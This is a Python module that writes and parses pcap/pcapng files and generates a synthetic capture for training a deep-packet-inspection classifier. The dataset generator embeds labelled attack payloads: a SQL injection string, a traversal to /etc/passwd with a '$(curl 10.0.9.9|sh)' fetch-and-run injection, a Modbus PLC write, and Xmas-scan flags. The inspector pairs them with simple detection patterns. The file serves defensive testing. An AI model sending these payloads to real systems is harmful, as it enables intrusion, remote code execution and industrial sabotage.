"""RFC-Compliant Libpcap (`.pcap`) & PCAPNG (`.pcapng`) Wire-Capture Reader, Writer, & DPI Gate.

Zero-dependency parser & generator supporting:
  - Classic Libpcap (`0xA1B2C3D4` microsecond & `0xA1B23C4D` nanosecond, LE/BE, Ethernet/RAW-IP)
  - Next-Gen PCAPNG (`0x0A0D0D0A` SHB, `0x00000001` IDB, `0x00000006` Enhanced Packet Block)
  - Real IEEE 802.3 Ethernet + IEEE 802.1Q VLAN (`0x8100`) + RFC 791 IPv4 (with valid header
    checksums) + TCP/UDP + RFC 7348 VXLAN (`UDP:4789`) + HTTP/JSON/gRPC/DNS/Modbus/SQLi/Traversal
    L7 frames inspectable directly via `tcpdump -nn -r` or Wireshark!
"""

from __future__ import annotations

from pathlib import Path
import struct
import numpy as np


PCAP_GLOBAL_HDR_LE = struct.Struct("<IHHiIII")
PCAP_PKT_HDR_LE = struct.Struct("<IIII")
PCAP_GLOBAL_HDR_BE = struct.Struct(">IHHiIII")
PCAP_PKT_HDR_BE = struct.Struct(">IIII")


def ipv4_header_checksum(hdr20: bytes) -> int:
    if len(hdr20) % 2 == 1:
        hdr20 = hdr20 + b"\x00"
    acc = sum(struct.unpack(f">{len(hdr20) // 2}H", hdr20))
    while acc >> 16:
        acc = (acc & 0xFFFF) + (acc >> 16)
    return (~acc) & 0xFFFF


def build_ethernet_ipv4_frame(
    payload: bytes,
    src_port: int,
    dst_port: int,
    proto: int = 6,
    tcp_flags: int = 0x18,
    vlan_id: int | None = None,
    vxlan_vni: int | None = None,
) -> bytes:
    """Constructs a valid Wireshark/`tcpdump`-parseable Ethernet/VLAN/VXLAN/IPv4/L4/L7 frame."""
    dst_mac = b"\x00\x0a\x35\x00\x26\x01"  # AMD/Xilinx OUI (Kria KV260!)
    src_mac = b"\x00\x1b\x21\xaa\xbb\xcc"

    if proto == 6:  # TCP (20B header)
        l4 = struct.pack(
            ">HHIIBBHHH",
            src_port & 0xFFFF,
            dst_port & 0xFFFF,
            0x01020304,
            0x05060708,
            (5 << 4),
            tcp_flags & 0xFF,
            64240,
            0,
            0,
        )
    else:  # UDP (8B header)
        udp_len = 8 + len(payload)
        l4 = struct.pack(">HHHH", src_port & 0xFFFF, dst_port & 0xFFFF, udp_len, 0)

    ip_total = 20 + len(l4) + len(payload)
    ip_wo_csum = struct.pack(
        ">BBHHHBBH4s4s",
        0x45,
        0x00,
        ip_total,
        0x1337,
        0x4000,
        64,
        proto,
        0,
        b"\x0a\x00\x01\x0a",  # 10.0.1.10
        b"\x0a\x00\x02\x14",  # 10.0.2.20
    )
    csum = ipv4_header_checksum(ip_wo_csum)
    inner_ip = ip_wo_csum[:10] + struct.pack(">H", csum) + ip_wo_csum[12:] + l4 + payload

    if vxlan_vni is not None:
        inner_eth = dst_mac + src_mac + b"\x08\x00" + inner_ip
        vxlan_hdr = struct.pack(">II", 0x08000000, (vxlan_vni & 0xFFFFFF) << 8)
        outer_payload = vxlan_hdr + inner_eth
        outer_udp = struct.pack(">HHHH", 54321, 4789, 8 + len(outer_payload), 0)
        outer_tot = 20 + len(outer_udp) + len(outer_payload)
        o_ip0 = struct.pack(
            ">BBHHHBBH4s4s",
            0x45,
            0x00,
            outer_tot,
            0x2468,
            0x4000,
            64,
            17,
            0,
            b"\xac\x10\x00\x01",
            b"\xac\x10\x00\x02",
        )
        o_csum = ipv4_header_checksum(o_ip0)
        o_ip = o_ip0[:10] + struct.pack(">H", o_csum) + o_ip0[12:] + outer_udp + outer_payload
        return dst_mac + src_mac + b"\x08\x00" + o_ip

    if vlan_id is not None:
        vlan_tag = struct.pack(">HH", 0x8100, vlan_id & 0x0FFF)
        return dst_mac + src_mac + vlan_tag + b"\x08\x00" + inner_ip

    return dst_mac + src_mac + b"\x08\x00" + inner_ip


def write_pcap_file(path: str | Path, frames: list[bytes], linktype: int = 1) -> None:
    """Writes standard Libpcap `.pcap` (`LINKTYPE_ETHERNET = 1`) readable by `tcpdump`/Wireshark."""
    out = Path(path)
    out.parent.mkdir(parents=True, exist_ok=True)
    with open(out, "wb") as f:
        f.write(PCAP_GLOBAL_HDR_LE.pack(0xA1B2C3D4, 2, 4, 0, 0, 65535, linktype))
        for idx, raw in enumerate(frames):
            ts_sec = 1795258800 + (idx // 1000)
            ts_usec = (idx % 1000) * 1000
            f.write(PCAP_PKT_HDR_LE.pack(ts_sec, ts_usec, len(raw), len(raw)))
            f.write(raw)


def read_pcap_or_pcapng(path: str | Path) -> list[np.ndarray]:
    """Reads packets from `.pcap` (LE/BE, us/ns) or `.pcapng` (`Enhanced Packet Block`)."""
    data = Path(path).read_bytes()
    if len(data) < 24:
        raise ValueError(f"Capture file too short: {path}")

    magic_le = struct.unpack_from("<I", data, 0)[0]
    packets: list[np.ndarray] = []

    # 1. PCAPNG Section Header Block (`0x0A0D0D0A`)
    if magic_le == 0x0A0D0D0A:
        off = 0
        while off + 8 <= len(data):
            blk_type, blk_len = struct.unpack_from("<II", data, off)
            if blk_len < 12 or off + blk_len > len(data):
                break
            if blk_type == 0x00000006 and blk_len >= 32:  # Enhanced Packet Block (EPB)
                cap_len = struct.unpack_from("<I", data, off + 20)[0]
                pkt_bytes = data[off + 28 : off + 28 + cap_len]
                packets.append(np.frombuffer(pkt_bytes, dtype=np.uint8).copy())
            off += blk_len
        return packets

    # 2. Classic Libpcap (`.pcap`)
    if magic_le in (0xA1B2C3D4, 0xA1B23C4D):
        pkt_hdr = PCAP_PKT_HDR_LE
    elif magic_le in (0xD4C3B2A1, 0x4D3CB2A1):
        pkt_hdr = PCAP_PKT_HDR_BE
    else:
        raise ValueError(f"Unsupported PCAP/PCAPNG magic: 0x{magic_le:08X}")

    off = 24
    while off + 16 <= len(data):
        _ts_s, _ts_u, incl_len, _orig_len = pkt_hdr.unpack_from(data, off)
        off += 16
        if off + incl_len > len(data):
            break
        packets.append(np.frombuffer(data[off : off + incl_len], dtype=np.uint8).copy())
        off += incl_len
    return packets


def inspect_ethernet_frame_verdict(pkt: np.ndarray, allow_zeroday_cls8: bool = True) -> int:
    """
    Real Ethernet / 802.1Q VLAN / VXLAN / IPv4 / TCP-UDP / L7-AST Deep Packet Inspector (RCE Gate).
    Maps any standard wire capture packet into CLAI's 9 security verdict classes (0..8).
    """
    b = bytes(pkt.tolist())
    if len(b) < 34:
        return 6

    eth_off = 14
    ethertype = struct.unpack_from(">H", b, 12)[0]
    if ethertype == 0x8100 and len(b) >= 38:  # 802.1Q VLAN Tag
        ethertype = struct.unpack_from(">H", b, 16)[0]
        eth_off = 18

    if ethertype != 0x0800 or len(b) < eth_off + 20:
        return 6

    ihl = (b[eth_off] & 0x0F) * 4
    proto = b[eth_off + 9]
    l4_off = eth_off + ihl
    if len(b) < l4_off + 8:
        return 6

    # Unwrap VXLAN (UDP dst_port == 4789) transparently for ground-truth DPI oracle!
    dst_port = struct.unpack_from(">H", b, l4_off + 2)[0]
    if proto == 17 and dst_port == 4789 and len(b) >= l4_off + 8 + 8 + 34:
        inner = np.frombuffer(b[l4_off + 16 :], dtype=np.uint8)
        return inspect_ethernet_frame_verdict(inner, allow_zeroday_cls8=allow_zeroday_cls8)

    if proto == 6:  # TCP
        if len(b) < l4_off + 20:
            return 6
        data_off = ((b[l4_off + 12] >> 4) & 0x0F) * 4
        tcp_flags = b[l4_off + 13]
        payload = b[l4_off + data_off :]
        if (tcp_flags & 0x23) == 0x23:  # SYN|FIN|URG Xmas scan!
            return 7
    elif proto == 17:  # UDP
        payload = b[l4_off + 8 :]
    else:
        return 6

    if dst_port == 53 and proto == 17:
        return 2  # ALLOW_DNS_QUERY
    if dst_port == 502 and len(payload) >= 8:
        fc = payload[7]
        if fc == 0x10 and allow_zeroday_cls8:
            return 8  # ISOLATE_ZERODAY_MODBUS_WRITE
        if fc in (0x03, 0x04):
            return 3  # ALLOW_MODBUS_READ
        return 6
    if dst_port == 50051:
        return 1  # ALLOW_GRPC_TELEMETRY

    if b"UNION SELECT" in payload or b"OR 1=1" in payload:
        return 4  # DROP_SQLI_AST
    if b"../" in payload or b"$(" in payload:
        return 5  # DROP_CMD_TRAVERSAL
    if b"{" in payload:
        if (payload.count(b"{") + payload.count(b"[")) != (payload.count(b"}") + payload.count(b"]")):
            return 6  # QUARANTINE_BAD_AST
    if dst_port in (80, 443, 8080):
        return 0  # ALLOW_HTTP_JSON
    return 6


def generate_enterprise_pcap_dataset(
    path: str | Path, total_packets: int = 5120, seed: int = 42
) -> Path:
    """
    Synthesizes a 5,120-packet Wireshark/tcpdump-valid `.pcap` capture containing:
      - Packets 0..2047:    Raw Ethernet IPv4 enterprise traffic (Classes 0..7)
      - Packets 2048..3839: Live 802.1Q VLAN 100 migration (`0x8100`)
      - Packets 3840..4095: Live Zero-Day SCADA Modbus FC=0x10 PLC override (`Class 8`)
      - Packets 4096..5119: Live VXLAN VNI=42 datacenter overlay migration (`UDP:4789`)
    """
    rng = np.random.default_rng(seed)
    frames: list[bytes] = []

    for idx in range(total_packets):
        vlan_id = 100 if (2048 <= idx < 4096) else None
        vxlan_vni = 42 if idx >= 4096 else None
        max_cls = 9 if idx >= 3840 else 8
        cls_id = int(rng.integers(0, max_cls))
        sport = int(rng.integers(32768, 61000))

        if cls_id == 0:
            pl = f'POST /v1/items HTTP/1.1\r\n{{"id":{int(rng.integers(10, 99))},"ok":true}}'.encode()
            raw = build_ethernet_ipv4_frame(pl, sport, 443, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 1:
            pl = b"\x00\x00\x00\x00\x12\x08\x2a\x12\x0eclai.telemetry"
            raw = build_ethernet_ipv4_frame(pl, sport, 50051, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 2:
            tx = int(rng.integers(1, 255))
            pl = bytes([tx, 0x01, 0x01, 0x00, 0x00, 0x01]) + b"\x03api\x04clai\x02io\x00\x00\x01\x00\x01"
            raw = build_ethernet_ipv4_frame(pl, sport, 53, proto=17, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 3:
            reg = int(rng.integers(0, 32))
            pl = bytes([0x00, 0x01, 0x00, 0x00, 0x00, 0x06, 0x01, 0x03, 0x00, reg, 0x00, 0x02])
            raw = build_ethernet_ipv4_frame(pl, sport, 502, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 4:
            pl = b"GET /search?q=' OR 1=1 UNION SELECT token FROM secrets-- HTTP/1.1\r\n"
            raw = build_ethernet_ipv4_frame(pl, sport, 443, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 5:
            pl = b"GET /../../../../etc/passwd; $(curl 10.0.9.9|sh) HTTP/1.1\r\n"
            raw = build_ethernet_ipv4_frame(pl, sport, 80, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 6:
            pl = b'POST /v1/cfg HTTP/1.1\r\n{"rules":[{"broken":true'
            raw = build_ethernet_ipv4_frame(pl, sport, 443, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)
        elif cls_id == 7:
            pl = bytes(rng.integers(0x80, 0xFF, size=(12,), dtype=np.uint8).tolist())
            raw = build_ethernet_ipv4_frame(
                pl, sport, int(rng.integers(1024, 9000)), proto=6, tcp_flags=0x2B, vlan_id=vlan_id, vxlan_vni=vxlan_vni
            )
        else:
            pl = b"\x00\x09\x00\x00\x00\x0B\x01\x10\xFF\x00\x00\x02\x04\xDE\xAD\xBE\xEF"
            raw = build_ethernet_ipv4_frame(pl, sport, 502, proto=6, vlan_id=vlan_id, vxlan_vni=vxlan_vni)

        frames.append(raw)

    out_path = Path(path)
    write_pcap_file(out_path, frames)
    return out_path


class PcapReplayEnv:
    """Streams real `.pcap` / `.pcapng` wire captures directly into `MixtureOfLimitsRuntime`."""

    def __init__(self, pcap_path: str | Path, base_n_classes: int = 8):
        self.pcap_path = Path(pcap_path)
        self.packets = read_pcap_or_pcapng(self.pcap_path)
        if not self.packets:
            raise ValueError(f"No packets found in {self.pcap_path}")
        self.base_n_classes = base_n_classes
        self.n_classes = base_n_classes
        self.regime_id = 0
        self.cursor = 0

    def mutate_regime(self) -> None:
        self.regime_id += 1

    def spawn_novel_class(self) -> int:
        self.n_classes = 9
        return 8

    def ground_truth(self, x: np.ndarray) -> int:
        return inspect_ethernet_frame_verdict(x, allow_zeroday_cls8=True)

    def sample_episode(self) -> tuple[np.ndarray, int]:
        pkt = self.packets[self.cursor % len(self.packets)]
        self.cursor += 1
        return pkt, self.ground_truth(pkt)

    def sample_microbatch(self, batch_size: int = 64) -> tuple[list[np.ndarray], np.ndarray]:
        eps: list[np.ndarray] = []
        gts = np.empty(batch_size, dtype=np.int64)
        for i in range(batch_size):
            p, g = self.sample_episode()
            eps.append(p)
            gts[i] = g
        return eps, gts

    def verify(self, x: np.ndarray, proposed_action: int) -> bool:
        return int(proposed_action) == self.ground_truth(x)

    def verify_subset(
        self, episodes: list[np.ndarray], indices: np.ndarray, actions: np.ndarray
    ) -> np.ndarray:
        return np.array(
            [self.verify(episodes[int(idx)], int(act)) for idx, act in zip(indices, actions)],
            dtype=bool,
        )
